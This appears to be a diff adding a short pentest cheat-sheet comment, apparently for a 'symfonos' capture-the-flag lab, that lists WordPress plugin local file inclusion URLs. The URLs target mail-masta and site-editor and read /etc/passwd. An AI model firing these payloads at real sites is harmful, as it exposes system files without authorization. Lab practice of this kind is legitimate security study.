@@ -1,0 +1,16 @@
+#########################################################################
+# Enumerate vulnerable plugins without WPSCAN token is imposible so ... #
+# use this wordpress wordlists                                          #
+#########################################################################
+
+#########################################################################################################################################                              
+# [+] mail-masta [+]                                                                                                                    #                              
+#                                                                                                                                       #                              
+# http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd                              #                              
+#                                                                                                                                       #                              
+#                                                                                                                                       #                              
+# [+] site-editor [+]                                                                                                                   #                              
+#                                                                                                                                       #                              
+# http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd  #                              
+#                                                                                                                                       #                              
+#########################################################################################################################################
